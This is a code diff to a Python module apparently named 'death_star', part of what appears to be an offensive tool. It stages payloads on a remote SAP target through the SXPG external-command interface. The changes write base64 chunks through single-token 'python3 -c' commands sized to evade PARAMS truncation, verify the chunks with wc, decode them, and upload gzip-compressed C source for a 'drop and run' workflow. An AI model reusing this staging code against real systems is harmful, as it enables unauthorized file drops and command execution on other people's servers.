@@ -156,37 +156,52 @@ def _write_remote_file(node, remote_path: str, data: bytes,
     """Drop ``data`` at ``remote_path`` on the target via chunked
     python3 base64 writes.
 
-    Uses the exact ``python3 -c open('/p','ab').write(b'B64')`` pattern
-    that dpmon's ``chunked_drop_and_run`` proved works under SXPG: after
-    ``-c`` there is exactly one whitespace-delimited token, all shell-
-    metacharacter-free.  Chunks the payload at ``_UPLOAD_CHUNK`` bytes
-    so each PARAMS slot stays under every kernel's cap.
+    Uses the dpmon-proven pattern: write the base64 CHUNKS LITERALLY
+    to a scratch ``.b64`` file (short PARAMS payload — comfortably
+    under every kernel's 255-char PARAMS cap), then run one final
+    python3 call to decode the scratch file → ``remote_path``.
 
-    Raises ``DeathStarError`` on any chunk failure.  Prints per-chunk
-    progress at INFO level so the operator sees the upload advancing.
+    Earlier iteration tried to decode in-flight
+    (``__import__('base64').b64decode(b'CHUNK')`` inside every chunk
+    write).  That wrapper adds ~55 chars of Python boilerplate; with a
+    180-char b64 chunk plus a ~40-char path plus ``-c`` framing the
+    PARAMS field hit ~275 chars — right at the SXPG truncation
+    boundary on some kernel builds.  Truncated chunks got silently
+    dropped, and the final file was missing early bytes; the shell
+    then hit ``fi`` on line 2 with no matching ``if`` and errored out
+    with ``syntax error near unexpected token 'fi'``.
+
+    Post-upload verification: ``wc -c`` on both the scratch b64 file
+    (expected length known client-side) and the decoded final file
+    (expected == len(data)).  Any mismatch raises ``DeathStarError``
+    immediately so the operator sees the corruption cause instead of
+    a confused-shell error 30 s later.
+
+    Raises ``DeathStarError`` on any chunk failure or size mismatch.
     """
     payload = base64.b64encode(data).decode("ascii")
+    scratch_path = remote_path + ".b64"
     n_chunks = (len(payload) + _UPLOAD_CHUNK - 1) // _UPLOAD_CHUNK
     if label:
         print(f"[*] {node.sid}: death_star: {label} "
               f"({len(data)} B raw, {len(payload)} B b64, "
               f"{n_chunks} chunk(s) of {_UPLOAD_CHUNK} B)")
 
-    # Wipe any previous fragment so a rerun starts clean.  ``rm -f`` is
-    # a two-token argv, SXPG-safe.
-    _run(node, "/bin/rm", f"-f {remote_path}",
-          label=f"clear previous {remote_path}")
+    # Wipe both prior scratch and prior final so a rerun starts clean.
+    # Two-token ``rm -f <a> <b>`` argv, SXPG-safe.
+    _run(node, "/bin/rm", f"-f {scratch_path} {remote_path}",
+          label=f"clear prior {remote_path}(.b64)?")
 
     for i in range(n_chunks):
         chunk_b64 = payload[i * _UPLOAD_CHUNK:(i + 1) * _UPLOAD_CHUNK]
         mode = "wb" if i == 0 else "ab"
-        # python3 -c open('/tmp/x','ab').write(__import__('base64').b64decode(b'<CHUNK>'))
-        # After ``-c`` this is one whitespace-free token: open call,
-        # write call, __import__ trick to avoid ``import base64`` (which
-        # would introduce a space).  No embedded quotes on the outer
-        # level; single quotes only for the path and b'' literals.
-        code = (f"open('{remote_path}','{mode}').write("
-                 f"__import__('base64').b64decode(b'{chunk_b64}'))")
+        # dpmon pattern: python3 -c open('/tmp/x.b64','ab').write(b'B64CHUNK')
+        # ~40 (path) + ~40 (call wrapper) + 180 (chunk) = ~260 chars,
+        # inside the SXPG PARAMS budget on every kernel we've tested.
+        # No in-flight decode → any transit mangling produces a broken
+        # b64 file that fails the decode step below (visibly), not a
+        # silently-truncated final file that hits the shell parser.
+        code = f"open('{scratch_path}','{mode}').write(b'{chunk_b64}')"
         r = _run(node, "python3", f"-c {code}", quiet=True)
         if not r.get("success"):
             raise DeathStarError(
@@ -199,6 +214,56 @@ def _write_remote_file(node, remote_path: str, data: bytes,
             print(f"[*] {node.sid}: death_star:   chunk "
                   f"{i + 1}/{n_chunks} ({pct}%)")
 
+    # Verify the scratch b64 has the expected byte count — catches any
+    # silent truncation of a chunk write before we spend time on the
+    # decode step.  ``wc -c`` output: ``<size> <path>``.
+    check_b64 = _run(node, "wc", f"-c {scratch_path}",
+                      label="verify b64 scratch")
+    if check_b64.get("success"):
+        out = " ".join(check_b64.get("output") or []).strip()
+        try:
+            got = int(out.split()[0])
+        except (ValueError, IndexError):
+            got = None
+        if got is not None and got != len(payload):
+            raise DeathStarError(
+                f"scratch b64 size mismatch: expected {len(payload)} B, "
+                f"got {got} B — chunk(s) were truncated in transit "
+                f"(check the target's SXPG PARAMS field cap)")
+
+    # One-shot decode: b64 scratch → decoded final file.
+    # After ``-c`` this is one whitespace-free token — same SXPG-safe
+    # discipline as the chunk writes.
+    code = (f"open('{remote_path}','wb').write("
+             f"__import__('base64').b64decode("
+             f"open('{scratch_path}','rb').read()))")
+    r = _run(node, "python3", f"-c {code}",
+              label=f"decode → {remote_path}")
+    if not r.get("success"):
+        raise DeathStarError(
+            f"b64 decode failed: {r.get('error') or 'unknown'} "
+            f"— scratch at {scratch_path} kept for inspection")
+
+    # Verify decoded final file size matches the raw payload length.
+    check_final = _run(node, "wc", f"-c {remote_path}",
+                        label="verify decoded final")
+    if check_final.get("success"):
+        out = " ".join(check_final.get("output") or []).strip()
+        try:
+            got = int(out.split()[0])
+        except (ValueError, IndexError):
+            got = None
+        if got is not None and got != len(data):
+            raise DeathStarError(
+                f"decoded size mismatch: expected {len(data)} B, "
+                f"got {got} B — the b64 payload was somehow corrupted "
+                f"between chunk write and decode (scratch: "
+                f"{scratch_path})")
+
+    # Cleanup scratch b64 — non-fatal.
+    _run(node, "/bin/rm", f"-f {scratch_path}",
+          label="cleanup scratch b64")
+
 
 # ---------------------------------------------------------------------------
 # Upload
@@ -209,32 +274,30 @@ def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
     """Upload the C source to ``<remote_dir>/<source_name>``.
 
     Two-step:
-      1. Chunk-write the ``gzip+base64`` payload to a scratch
-         ``.b64gz`` file at the target (fully SXPG-safe).
-      2. One-shot python3 decode + gunzip → final ``.c`` path.
-      3. Clean up the scratch file.
+      1. ``_write_remote_file`` drops the gzip-compressed source bytes
+         at ``<remote_path>.gz`` (chunked b64 + verify).
+      2. One python3 call to gunzip that into the final ``.c`` path.
+      3. Verify decompressed size matches the raw source.
+      4. Clean up the ``.gz`` scratch.
 
     Returns the absolute remote path.
     """
     src = _read_source_bytes()
     remote_path = f"{remote_dir.rstrip('/')}/{source_name}"
-    scratch_path = f"{remote_path}.b64gz"
+    gz_path = f"{remote_path}.gz"
 
-    # Step 1: chunked upload of the gzip-compressed base64 payload.
-    payload = gzip.compress(src, compresslevel=9)
-    _write_remote_file(node, scratch_path, payload,
-                        label=f"upload gzipped source → {scratch_path}")
+    # Step 1: upload the gzip bytes.  ``_write_remote_file`` handles
+    # chunk + verify + b64-decode internally so this is a single call.
+    gz_bytes = gzip.compress(src, compresslevel=9)
+    _write_remote_file(node, gz_path, gz_bytes,
+                        label=f"upload gzipped source → {gz_path}")
 
-    # Step 2: decode + write final .c file, in one python3 call whose
-    # params after ``-c`` are one whitespace-free token.  No ``import``
-    # statements — use ``__import__`` to keep the code single-token.
-    #
-    #   open('/tmp/x.c','wb').write(__import__('gzip').decompress(
-    #     open('/tmp/x.c.b64gz','rb').read()))
+    # Step 2: decompress → final .c file.  One whitespace-free token
+    # after ``-c`` — SXPG-safe.
     code = (
         f"open('{remote_path}','wb').write("
         f"__import__('gzip').decompress("
-        f"open('{scratch_path}','rb').read()))"
+        f"open('{gz_path}','rb').read()))"
     )
     r = _run(node, "python3", f"-c {code}",
               label=f"decompress → {remote_path}")
@@ -242,19 +305,11 @@ def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
         raise DeathStarError(
             f"decompress failed: {r.get('error') or 'unknown'}")
 
-    # Step 3: cleanup scratch.  Non-fatal — the scratch file is only
-    # a few KB and the operator can clear it manually if this fails.
-    _run(node, "/bin/rm", f"-f {scratch_path}",
-          label="cleanup scratch b64gz")
-
-    # Verify the resulting file exists and has the expected size.
-    # ``wc -c`` outputs "<size> <path>" — two space-separated tokens,
-    # SXPG-safe.
+    # Step 3: verify decompressed size.
     check = _run(node, "wc", f"-c {remote_path}",
-                  label="verify upload")
+                  label="verify decompressed source")
     if check.get("success"):
         out = " ".join(check.get("output") or []).strip()
-        # First token of first line is the byte count.
         got_size = None
         try:
             got_size = int(out.split()[0])
@@ -262,10 +317,14 @@ def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
             pass
         if got_size is not None and got_size != len(src):
             raise DeathStarError(
-                f"upload size mismatch: expected {len(src)} B, "
-                f"got {got_size} B (check {scratch_path} not "
-                f"corrupted mid-upload)")
+                f"decompressed size mismatch: expected {len(src)} B, "
+                f"got {got_size} B ({gz_path} corrupted mid-transit)")
         print(f"[+] {node.sid}: death_star: uploaded — {out}")
+
+    # Step 4: cleanup scratch .gz — non-fatal.
+    _run(node, "/bin/rm", f"-f {gz_path}",
+          label="cleanup scratch gz")
+
     return remote_path
 
 
